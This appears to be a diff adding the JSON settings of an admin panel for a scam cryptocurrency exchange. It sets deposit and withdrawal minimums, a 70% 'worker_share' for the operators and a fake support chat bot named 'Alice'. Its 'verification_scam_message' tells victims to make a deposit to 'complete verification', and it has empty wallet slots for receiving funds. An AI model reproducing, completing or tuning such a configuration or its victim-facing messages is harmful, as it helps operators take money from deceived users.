@@ -1,0 +1,38 @@
+{
+  "panel_settings": {
+    "minimum_deposit": "50",
+    "minimum_withdraw": "100",
+    "register_balance": "0",
+    "worker_share": "70%",
+    "chat_bot_name": "Alice",
+    "super_account_keyword": "olympus",
+    "auto_kyc_after_deposits": 5,
+    "postback_click_id": "olympus"
+  },
+  "notification_settings": {
+    "support": false,
+    "deposit": false,
+    "kyc": false,
+    "withdraw": false
+  },
+  "support_access": {
+    "users": true,
+    "domains": true,
+    "transactions": true,
+    "promos": true
+  },
+  "verification_scam_message": "A simplified online verification procedure that requires you to make a deposit of %sum_verif% or more. Once the deposit is credited to your balance, verification will be completed.",
+  "verification_tiers": {
+    "tier_1": 100,
+    "tier_2": 100,
+    "tier_3": 70
+  },
+  "wallets": {
+    "bitcoin": null,
+    "ethereum": null,
+    "bsc": null,
+    "polygon": null,
+    "solana": null,
+    "tron": null
+  }
+}
